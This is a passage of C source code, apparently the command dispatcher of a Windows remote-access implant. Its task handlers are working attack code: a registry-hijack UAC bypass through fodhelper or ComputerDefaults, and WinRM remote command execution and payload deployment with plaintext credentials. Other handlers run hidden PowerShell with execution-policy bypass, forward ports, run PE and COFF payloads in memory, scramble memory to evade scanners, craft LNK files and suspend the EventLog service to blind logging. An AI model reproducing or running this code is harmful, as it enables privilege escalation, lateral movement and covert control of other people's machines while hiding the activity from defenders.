            if (ml < sizeof(elv_meth)) { memcpy(elv_meth, args, ml); elv_meth[ml] = '\0'; }
            strncpy(elv_cmd, sp + 1, sizeof(elv_cmd) - 1);
        } else if (args && args[0]) {
            strncpy(elv_meth, args, sizeof(elv_meth) - 1);
        }
        if (!elv_cmd[0]) GetModuleFileNameA(NULL, elv_cmd, (DWORD)sizeof(elv_cmd));
        const char *regPath = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command";
        char reg1[2048], reg2[1024];
        snprintf(reg1, sizeof(reg1), "reg add \"%s\" /ve /t REG_SZ /d \"%s\" /f", regPath, elv_cmd);
        snprintf(reg2, sizeof(reg2), "reg add \"%s\" /v \"DelegateExecute\" /t REG_SZ /d \"\" /f", regPath);
        char *r1 = run_shell(reg1); free(r1);
        char *r2 = run_shell(reg2); free(r2);
        const char *exe3 = (_stricmp(elv_meth, "computerdefaults") == 0)
            ? "C:\\Windows\\System32\\ComputerDefaults.exe"
            : "fodhelper.exe";
        char run_cmd[256];
        snprintf(run_cmd, sizeof(run_cmd), "start %s", exe3);
        char *r3 = run_shell(run_cmd); free(r3);
        Sleep(2000);
        char *r4 = run_shell("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f"); free(r4);
        char out_msg[512];
        snprintf(out_msg, sizeof(out_msg), "[+] UAC bypass (%s) triggered: %s", elv_meth, elv_cmd);
        agent_send_result(task->id, out_msg, "");
    }
    else if (strcmp(type_upper, "WINRM_EXEC") == 0) {
        char wr_target[256]="", wr_user[256]="", wr_pass[256]="", wr_cmd[1024]="";
        json_get_str(args,"target",wr_target,sizeof(wr_target),"");
        json_get_str(args,"user",wr_user,sizeof(wr_user),"");
        json_get_str(args,"pass",wr_pass,sizeof(wr_pass),"");
        json_get_str(args,"cmd",wr_cmd,sizeof(wr_cmd),"");
        if (!wr_target[0]||!wr_cmd[0]) {
            agent_send_result(task->id,"","WINRM_EXEC: {target,user,pass,cmd} required"); return;
        }
        char ps_buf[4096];
        snprintf(ps_buf, sizeof(ps_buf),
            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
            "try{$ip=([System.Net.Dns]::GetHostAddresses('%s')|"
            "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
            "catch{$ip='%s'};"
            "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {try{%s|Out-String -Width 256}catch{$_.Exception.Message}}",
            wr_target, wr_target, wr_user, wr_pass, wr_cmd);
        char sh_cmd[5120];
        snprintf(sh_cmd, sizeof(sh_cmd), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf);
        char *out3 = run_shell(sh_cmd);
        agent_send_result(task->id, out3?out3:"", ""); free(out3);
    }
    else if (strcmp(type_upper, "WINRM_DEPLOY") == 0) {
        char wd_target[256]="", wd_user[256]="", wd_pass[256]="", wd_payload[2048]="";
        json_get_str(args,"target",wd_target,sizeof(wd_target),"");
        json_get_str(args,"user",wd_user,sizeof(wd_user),"");
        json_get_str(args,"pass",wd_pass,sizeof(wd_pass),"");
        json_get_str(args,"payload",wd_payload,sizeof(wd_payload),"");
        if (!wd_target[0]||!wd_payload[0]) {
            agent_send_result(task->id,"","WINRM_DEPLOY: {target,user,pass,payload} required"); return;
        }
        char ps_buf2[4096];
        snprintf(ps_buf2, sizeof(ps_buf2),
            "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;"
            "try{$ip=([System.Net.Dns]::GetHostAddresses('%s')|"
            "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}"
            "catch{$ip='%s'};"
            "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
            "Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -AsJob "
            "-ScriptBlock {%s} | Out-Null",
            wd_target, wd_target, wd_user, wd_pass, wd_payload);
        char sh_cmd2[5120];
        snprintf(sh_cmd2, sizeof(sh_cmd2), "powershell -NoP -W Hidden -Exec Bypass -C \"%s\"", ps_buf2);
        char *out4 = run_shell(sh_cmd2);
        agent_send_result(task->id, out4?out4:"", ""); free(out4);
    }
    else if (strcmp(type_upper, "PIPE_START") == 0) {
        char *out = pipe_server_start(task->args && task->args[0] ? task->args : "");
        agent_send_result(task->id, out ? out : "[-] pipe_server_start failed", "");
        free(out);
    }
    else if (strcmp(type_upper, "PIPE_STOP") == 0) {
        char *out = pipe_server_stop(task->args && task->args[0] ? task->args : "");
        agent_send_result(task->id, out ? out : "[-] pipe_server_stop failed", "");
        free(out);
    }
    else if (strcmp(type_upper, "PORTFWD_LIST") == 0) {
        agent_send_result(task->id, portfwd_list(), "");
    }
    else if (strcmp(type_upper, "PORTFWD_ADD") == 0) {
        /* Args: "[tcp|udp] <lport> <rhost> <rport>" */
        char proto[8]="tcp", lhost[256]="", rportStr[8]="";
        int lport=0, rport=0;
        /* tokenize args */
        char argbuf[512]; strncpy(argbuf, args, sizeof(argbuf)-1);
        char *tok = strtok(argbuf, " \t");
        if (tok && (strcmp(tok,"tcp")==0 || strcmp(tok,"udp")==0)) {
            strncpy(proto, tok, sizeof(proto)-1); tok = strtok(NULL," \t");
        }
        if (tok) { lport = atoi(tok); tok = strtok(NULL," \t"); }
        if (tok) { strncpy(lhost, tok, sizeof(lhost)-1); tok = strtok(NULL," \t"); }
        if (tok) { rport = atoi(tok); }
        if (!lport || !lhost[0] || !rport) {
            agent_send_result(task->id,"","usage: [tcp|udp] <lport> <rhost> <rport>"); return;
        }
        agent_send_result(task->id, portfwd_add(proto, lport, lhost, rport), "");
    }
    else if (strcmp(type_upper, "PORTFWD_DEL") == 0) {
        /* Args: "[tcp|udp] <lport>" */
        char proto[8]="tcp"; int lport=0;
        char argbuf[128]; strncpy(argbuf, args, sizeof(argbuf)-1);
        char *tok = strtok(argbuf, " \t");
        if (tok && (strcmp(tok,"tcp")==0 || strcmp(tok,"udp")==0)) {
            strncpy(proto, tok, sizeof(proto)-1); tok = strtok(NULL," \t");
        }
        if (tok) lport = atoi(tok);
        if (!lport) { agent_send_result(task->id,"","usage: [tcp|udp] <lport>"); return; }
        agent_send_result(task->id, portfwd_del(proto, lport), "");
    }
    else if (strcmp(type_upper, "BOF_LIST") == 0) {
        agent_send_result(task->id,
            "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\n"
            "Supported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "");
    }
    else if (strcmp(type_upper, "MEM_FLUCTUATE") == 0) {
        char argbuf[64]; strncpy(argbuf, args, sizeof(argbuf)-1);
        char *tok = strtok(argbuf, " \t");
        if (!tok || strcmp(tok, "stop") == 0) {
            mem_fluctuate_stop();
            agent_send_result(task->id, "[+] memory scrambler stopped", "");
        } else {
            int interval = 10;
            tok = strtok(NULL, " \t");
            if (tok) interval = atoi(tok);
            if (interval <= 0) interval = 10;
            mem_fluctuate_start(interval);
            char msg[64];
            snprintf(msg, sizeof(msg), "[+] memory scrambler started (interval %ds)", interval);
            agent_send_result(task->id, msg, "");
        }
    }
    else if (strcmp(type_upper, "GEN_LNK") == 0) {
#ifdef _WIN32
        char target[512]="", lnk_args[512]="", working_dir[512]="";
        char icon_path[512]="", outfile[512]="";
        json_get_str(args,"target",target,sizeof(target),"");
        json_get_str(args,"args",lnk_args,sizeof(lnk_args),"");
        json_get_str(args,"working_dir",working_dir,sizeof(working_dir),"");
        json_get_str(args,"icon_path",icon_path,sizeof(icon_path),"");
        json_get_str(args,"outfile",outfile,sizeof(outfile),"");
        int icon_index = json_get_int(args,"icon_index",0);
        if (!target[0] || !outfile[0]) {
            agent_send_result(task->id,"","GEN_LNK: {target,outfile} required"); return;
        }
        agent_send_result(task->id, gen_lnk(target,lnk_args,working_dir,icon_path,icon_index,outfile), "");
#else
        agent_send_result(task->id,"","GEN_LNK: Windows only");
#endif
    }
    else if (strcmp(type_upper, "BOF_STORE_LOAD") == 0) {
        /* task->payload contains raw COFF bytes; args = name */
        char bname[128] = "";
        sscanf(task->args ? task->args : "", "%127s", bname);
        if (!bname[0]) { agent_send_result(task->id, "", "BOF_STORE_LOAD: missing name"); return; }
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "BOF_STORE_LOAD: no payload"); return;
        }
        bof_store_set(bname, task->payload, task->payload_len);
        char msg[192]; snprintf(msg,sizeof(msg),"[+] BOF '%s' loaded (%zu bytes)",bname,task->payload_len);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "BOF_STORE_LIST") == 0) {
        agent_send_result(task->id, bof_store_list_str(), "");
    }
    else if (strcmp(type_upper, "BOF_STORE_UNLOAD") == 0) {
        char bname[128] = "";
        sscanf(task->args ? task->args : "", "%127s", bname);
        if (bof_store_del(bname)) {
            char msg[192]; snprintf(msg,sizeof(msg),"[+] BOF '%s' unloaded",bname);
            agent_send_result(task->id, msg, "");
        } else {
            agent_send_result(task->id, "", "BOF_STORE_UNLOAD: name not found");
        }
    }
    /* ── Parity aliases & stubs ──────────────────────────────────────────── */
    else if (strcmp(type_upper, "PE_EXEC") == 0) {
        /* alias for EXEC_PE */
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "PE_EXEC: no PE payload"); return;
        }
        char *pe_out = exec_pe(task->payload, task->payload_len);
        agent_send_result(task->id, pe_out ? pe_out : "", ""); free(pe_out);
    }
    else if (strcmp(type_upper, "DETECTED") == 0) {
        agent_send_result(task->id, "[!] DETECTED flag acknowledged", "");
    }
    else if (strcmp(type_upper, "HOME") == 0 || strcmp(type_upper, "USERPROFILE") == 0) {
        const char *v = getenv("USERPROFILE"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "USERDOMAIN") == 0) {
        const char *v = getenv("USERDOMAIN"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "USERNAME") == 0 || strcmp(type_upper, "USER") == 0) {
        const char *v = getenv("USERNAME"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "COMPUTERNAME") == 0) {
        const char *v = getenv("COMPUTERNAME"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "TEMP") == 0) {
        const char *v = getenv("TEMP"); if (!v) v = getenv("TMP"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "DISPLAY") == 0) {
        const char *v = getenv("DISPLAY"); if (!v) v = "";
        agent_send_result(task->id, v, "");
    }
    else if (strcmp(type_upper, "EVENTLOG_SUSPEND") == 0 ||
             strcmp(type_upper, "EVENTLOG_RESUME") == 0) {
        int do_suspend = (strcmp(type_upper, "EVENTLOG_SUSPEND") == 0);
        /* find svchost.exe hosting EventLog via SC, then suspend/resume its threads */
        DWORD svc_pid = 0;
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            SC_HANDLE svc = OpenServiceA(scm, "EventLog", SERVICE_QUERY_STATUS);
            if (svc) {
                SERVICE_STATUS_PROCESS ssp = {0};
                DWORD nb = 0;
                if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                        (LPBYTE)&ssp, sizeof(ssp), &nb))
                    svc_pid = ssp.dwProcessId;
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }
        if (!svc_pid) {
            agent_send_result(task->id, "", "EVENTLOG: failed to locate EventLog PID"); return;
        }
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            agent_send_result(task->id, "", "EVENTLOG: CreateToolhelp32Snapshot failed"); return;
        }
        int count = 0;
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID == svc_pid) {
                    HANDLE th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (th) {
                        if (do_suspend) SuspendThread(th);
                        else ResumeThread(th);
                        CloseHandle(th); count++;
                    }
                }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
        char msg[128];
        snprintf(msg, sizeof(msg), "[+] EventLog %s: %d thread(s) affected",
                 do_suspend ? "suspended" : "resumed", count);
        agent_send_result(task->id, msg, "");
    }
#endif /* _WIN32 */
    else {
        char err[128];
        snprintf(err, sizeof(err), "unknown task type: %s", task->type);
        agent_send_result(task->id, "", err);
    }
}
